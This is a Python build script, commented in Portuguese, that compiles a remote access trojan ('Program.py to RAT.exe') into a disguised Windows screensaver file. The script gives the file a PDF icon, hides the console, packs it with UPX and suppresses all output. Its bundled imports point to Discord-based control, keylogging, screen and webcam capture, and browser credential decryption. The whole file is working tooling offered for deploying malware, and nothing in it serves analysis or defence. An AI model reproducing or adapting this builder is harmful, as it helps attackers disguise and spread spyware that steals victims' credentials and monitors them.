#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
BUILDER PROFISSIONAL V2 - Program.py to RAT.exe
Compila Program.py com central_client.py como modulo
Garante 100% de funcionamento em PCs remotos
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path
from datetime import datetime


class BuilderV2:
    def __init__(self):
        self.project_dir = Path(__file__).parent
        self.build_dir = self.project_dir / "build"
        self.dist_dir = self.project_dir / "dist"
        self.output_name = "progam.scr"
        self.source_file = "Program.py"
        self.temp_source_file = "Program_build.py"
    
    def print_header(self, text):
        print("\n" + "="*80)
        print(f" {text}")
        print("="*80 + "\n")
    
    def validate_source(self):
        self.print_header("VALIDANDO ARQUIVOS NECESSARIOS")
        
        required = ["Program.py", "central_client.py"]
        missing = []
        
        for file in required:
            path = self.project_dir / file
            if path.exists():
                size = path.stat().st_size / 1024
                print(f"[OK] {file} ({size:.1f} KB)")
            else:
                print(f"[ERRO] {file} - FALTANDO")
                missing.append(file)
        
        if missing:
            print(f"\n[FALHA] Arquivos necessarios faltando: {', '.join(missing)}")
            return False
        
        print("\n[OK] Validacao completa!")
        return True
    
    def check_pyinstaller(self):
        self.print_header("VERIFICANDO PYINSTALLER")
        
        def _check():
            try:
                result = subprocess.run(
                    [sys.executable, "-m", "PyInstaller", "--version"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                return result.returncode == 0, result.stdout.strip() if result.returncode == 0 else None
            except Exception:
                return False, None

        success, version = _check()
        
        if success:
            print(f"[OK] PyInstaller {version}")
            return True
        
        print(f"[WARN] PyInstaller nao encontrado. Tentando instalar...")
        
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "pyinstaller"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[OK] PyInstaller instalado com sucesso")
            
            success, version = _check()
            if success:
                print(f"[OK] PyInstaller {version}")
                return True
            else:
                print(f"[ERRO] Falha ao verificar PyInstaller apos instalacao")
                return False
                
        except Exception as e:
            print(f"[ERRO] Falha ao instalar PyInstaller: {e}")
            return False
    
    def clean_previous_builds(self):
        self.print_header("LIMPANDO BUILDS ANTERIORES")
        
        items_removed = 0
        
        for directory in [self.build_dir, self.dist_dir]:
            if directory.exists():
                # Clean contents without removing dir (Docker volume fix)
                for item in directory.iterdir():
                    try:
                        if item.is_dir():
                            shutil.rmtree(item)
                        else:
                            item.unlink()
                    except Exception as e:
                        print(f"[WARN] Nao foi possivel remover {item.name}: {e}")
                items_removed += 1
                print(f"[OK] {directory.name}/ limpo")
        
        for spec_file in self.project_dir.glob("*.spec"):
            spec_file.unlink()
            items_removed += 1
            print(f"[OK] {spec_file.name} removido")
            
        # Remove temp file if exists
        temp_file = self.project_dir / self.temp_source_file
        if temp_file.exists():
            temp_file.unlink()
            print(f"[OK] {self.temp_source_file} removido")
        
        if items_removed == 0:
            print("[OK] Sem arquivos anteriores")
        else:
            print(f"[OK] {items_removed} itens removidos")
        
        return True
    
    def create_runtime_hook(self):
        """Cria hook para garantir que central_client seja importavel"""
        hook_dir = self.project_dir / "hooks"
        hook_dir.mkdir(exist_ok=True)
        
        hook_file = hook_dir / "hook-central_client.py"
        hook_content = """
from PyInstaller.utils.hooks import collect_data_files

datas = [('central_client.py', '.')]
hiddenimports = ['central_client']
"""
        hook_file.write_text(hook_content)
        return str(hook_dir)
    
    def create_spec_file(self):
        self.print_header("CRIANDO ARQUIVO DE CONFIGURACAO")
        
        central_client_path = self.project_dir / "central_client.py"
        config_json_path = self.project_dir / "config.json"
        hook_path = self.create_runtime_hook()
        
        central_client_path_str = str(central_client_path).replace("\\", "\\\\")
        config_json_path_str = str(config_json_path).replace("\\", "\\\\")
        project_dir_str = str(self.project_dir).replace("\\", "\\\\")
        hook_path_str = str(hook_path).replace("\\", "\\\\")
        
        datas_parts = []
        if central_client_path.exists():
            datas_parts.append(f"(r'{central_client_path_str}', '.')")
        if config_json_path.exists():
            datas_parts.append(f"(r'{config_json_path_str}', '.')")
        datas_config = ', '.join(datas_parts)
        
        try:
            import certifi
            certifi_path = certifi.where()
            certifi_path_dir = str(Path(certifi_path).parent).replace("\\", "\\\\")
            
            if datas_config:
                datas_config += f", (r'{certifi_path_dir}', 'certifi')"
            else:
                datas_config = f"(r'{certifi_path_dir}', 'certifi')"
        except ImportError:
            print("[WARN] certifi nao encontrado, compilando sem bundle SSL")
        except Exception as e:
            print(f"[WARN] Erro ao configurar certifi: {e}, continuando sem bundle certifi")
        
        # SSL binaries
        python_dir = Path(sys.executable).parent
        ssl_dlls = []
        for dll_name in ['libssl-3-x64.dll', 'libssl-3.dll', 'libcrypto-3-x64.dll', 'libcrypto-3.dll']:
            dll_path = python_dir / dll_name
            if dll_path.exists():
                dll_str = str(dll_path).replace("\\", "\\\\")
                ssl_dlls.append(f"(r'{dll_str}', '.')")
        
        binaries_config = ', '.join(ssl_dlls) if ssl_dlls else ""
        
        # Icon
        icon_path = str(self.project_dir / "pdf.ico") if (self.project_dir / "pdf.ico").exists() else ""
        icon_path_str = icon_path.replace("\\", "\\\\")
        
        spec_content = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['{self.temp_source_file}'],
    pathex=[r'{project_dir_str}'],
    binaries=[{binaries_config}],
    datas=[{datas_config}],
    hiddenimports=[
        'central_client',
        'discord',
        'discord.ext',
        'discord.ext.commands',
        'discord.ui',
        'discord.http',
        'discord.gateway',
        'discord.state',
        'discord.client',
        'aiohttp',
        'aiofiles',
        'plyer',
        'plyer.platforms',
        'plyer.platforms.win',
        'pyautogui',
        'chardet',
        'psutil',
        'pyttsx3',
        'pyttsx3.drivers',
        'pyttsx3.drivers.sapi5',
        'pyaudio',
        'pynput',
        'pynput.keyboard',
        'pynput.mouse',
        'pynput.keyboard._win32',
        'pynput.mouse._win32',
        'PIL',
        'PIL.ImageGrab',
        'PIL.Image',
        'requests',
        'cv2',
        'Crypto',
        'Crypto.Cipher',
        'Crypto.Cipher.AES',
        'Crypto.Random',
        'Crypto.Protocol',
        'Crypto.Util',
        'Crypto.Util.Padding',
        'win32crypt',
        'win32api',
        'win32con',
        'win32security',
        'pythoncom',
        'nacl',
        'nacl.bindings',
        'pycaw',
        'pycaw.pycaw',
        'comtypes',
        'comtypes.client',
        'comtypes.GUID',
        'comtypes.gen',
        'numpy',
        'numpy.random',
        'numpy.lib',
        'tkinter',
        'tkinter.messagebox',
        'threading',
        'asyncio',
        'json',
        'base64',
        'tempfile',
        'shutil',
        'glob',
        'uuid',
        'logging',
        'datetime',
        'ssl',
        '_ssl',
        'certifi',
        'urllib3',
        'urllib3.util',
        'urllib3.util.ssl_',
        'urllib3.util.url',
        'cryptography',
        'cryptography.hazmat',
        'cryptography.hazmat.bindings',
        'cryptography.hazmat.backends',
        'cryptography.hazmat.backends.openssl',
    ],
    hookspath=[r'{hook_path_str}'],
    hooksconfig={{}},
    runtime_hooks=[],
    excludedimports=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{self.output_name.replace(".exe", "")}',
    icon=f'{icon_path_str}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
'''
        
        spec_file = self.project_dir / "Program_build.spec"
        spec_file.write_text(spec_content)
        print(f"[OK] {spec_file.name} criado")
        return str(spec_file)
    
    def create_icon(self):
        """Gera icone PDF profissional"""
        icon_path = str(self.project_dir / "pdf.ico")
        if os.path.exists(icon_path):
            return icon_path
        return None
    
    def prepare_source(self):
        """Cria uma copia temporaria do source, remove prints e adiciona redirecionamento de stdout"""
        self.print_header("PREPARANDO SOURCE CODE")
        
        source_path = self.project_dir / self.source_file
        temp_path = self.project_dir / self.temp_source_file
        
        try:
            with open(source_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Inject stdout redirection at the very beginning
            redirection_code = "import sys; import os; sys.stdout = open(os.devnull, 'w'); sys.stderr = open(os.devnull, 'w')\n"
            
            import re
            lines = content.split('\n')
            cleaned_lines = []
            
            for line in lines:
                stripped = line.lstrip()
                if stripped.startswith('print('):
                    cleaned_lines.append(line.replace(stripped, 'pass  #', 1))
                else:
                    cleaned_lines.append(line)
            
            cleaned_content = redirection_code + '\n'.join(cleaned_lines)
            
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(cleaned_content)
            
            removed = content.count('print(')
            print(f"[OK] Copia temporaria criada: {self.temp_source_file}")
            print(f"[OK] Redirecionamento de stdout/stderr adicionado")
            print(f"[OK] {removed} linhas de print removidas")
            return True
            
        except Exception as e:
            print(f"[ERRO] Erro ao preparar source: {e}")
            return False
    
    def build(self):
        
        spec_file = self.create_spec_file()
        
        print(f"[INFO] Compilando {self.temp_source_file}...")
        print(f"[INFO] Spec: {spec_file}")
        print(f"[INFO] Output: {self.output_name}\n")
        
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", spec_file, "--distpath", str(self.dist_dir)],
            cwd=str(self.project_dir)
        )
        
        if result.returncode != 0:
            print(f"\n[ERRO] Build falhou")
            return False
        
        return True
    
    def verify_output(self):
        self.print_header("VERIFICANDO SAIDA")
        
        exe_path = self.dist_dir / self.output_name
        
        # PyInstaller on Windows adds .exe to everything
        if not exe_path.exists():
            win_path = self.dist_dir / (self.output_name + '.exe')
            if win_path.exists():
                win_path.rename(exe_path)
                print(f"[OK] Renomeado {win_path.name} -> {self.output_name}")
        
        if not exe_path.exists():
            files = list(self.dist_dir.iterdir())
            print(f"[ERRO] {self.output_name} nao foi criado")
            print(f"[INFO] Arquivos em dist: {[f.name for f in files]}")
            return False
        
        size = exe_path.stat().st_size / (1024 * 1024)
        print(f"[OK] {self.output_name} criado com sucesso")
        print(f"[OK] Tamanho: {size:.1f} MB")
        print(f"[OK] Caminho: {exe_path}")
        
        return True
    
    def cleanup(self):
        self.print_header("LIMPEZA")
        
        if self.build_dir.exists():
            shutil.rmtree(self.build_dir)
            print("[OK] Diretorio build/ removido")
        
        hooks_dir = self.project_dir / "hooks"
        if hooks_dir.exists():
            shutil.rmtree(hooks_dir)
            print("[OK] Diretorio hooks/ removido")
            
        # Remove temp file
        temp_file = self.project_dir / self.temp_source_file
        if temp_file.exists():
            temp_file.unlink()
            print(f"[OK] {self.temp_source_file} removido")
            
        # Remove temp spec
        temp_spec = self.project_dir / "Program_build.spec"
        if temp_spec.exists():
            temp_spec.unlink()
            print(f"[OK] Program_build.spec removido")
        
        print("[OK] Limpeza concluida")
    
    def main(self):
        print("\n" + "="*80)
        print(" BUILDER V2 - Program.py to RAT.exe")
        print("="*80)
        print(f" Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80 + "\n")
        
        if not self.validate_source():
            print("\n[ERRO] Build falhou")
            return False
        
        if not self.check_pyinstaller():
            print("\n[ERRO] Build falhou")
            return False
        
        if not self.clean_previous_builds():
            print("\n[ERRO] Build falhou")
            return False
        
        if not self.prepare_source():
            print("\n[ERRO] Build falhou")
            return False
        
        if not self.build():
            print("\n[ERRO] Build falhou")
            return False
        
        if not self.verify_output():
            print("\n[ERRO] Build falhou")
            return False
        
        self.cleanup()
        
        print("\n" + "="*80)
        print(" SUCESSO - RAT.exe compilado e pronto para usar!")
        print("="*80)
        print(f" Fim: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80 + "\n")
        
        return True


if __name__ == "__main__":
    builder = BuilderV2()
    success = builder.main()
    
    if not success:
        print("\nBuild falhou!")
        sys.exit(1)
    
    sys.exit(0)
